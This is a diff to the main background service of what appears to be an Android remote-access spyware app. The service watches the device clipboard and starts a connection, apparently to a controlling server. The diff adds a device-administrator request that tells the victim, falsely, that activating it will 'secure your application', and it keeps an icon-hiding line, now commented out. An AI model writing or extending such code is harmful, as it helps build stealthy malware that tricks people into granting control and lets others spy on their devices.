@@ -1,8 +1,7 @@
 package com.etechd.l3mon;
 
-import android.app.AlarmManager;
-import android.app.PendingIntent;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ComponentName;
@@ -10,17 +9,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.IBinder;
-import android.os.SystemClock;
-import android.util.Log;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.util.Timer;
-import java.util.TimerTask;
-
 public class MainService extends Service {
     private static Context contextOfApplication;
+    public static ComponentName mAdminName;
+    public static DevicePolicyManager mDPM;
 
     public MainService() {
 
@@ -35,11 +31,22 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
+        PackageManager packageManager=this.getPackageManager();
+        mDPM = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        try {
+            mAdminName = new ComponentName(this, Class.forName("com.etechd.l3mon.DeviceAdmin"));
+            if (!mDPM.isAdminActive(mAdminName)) {
+                Intent intent2 = new Intent("android.app.action.ADD_DEVICE_ADMIN");
+                intent2.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
+                intent2.putExtra("android.app.extra.ADD_EXPLANATION", "Click on Activate button to secure your application.");
+                startActivity(intent2);
+            }
+        }catch (ClassNotFoundException e){
+            e.printStackTrace();
+        }
+
         // Hide App Icon
-        PackageManager pkg=this.getPackageManager();
-        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-
-
+        //packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
             public void onPrimaryClipChanged() {
@@ -64,7 +71,6 @@ public class MainService extends Service {
 
         ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
         clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
-
 
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
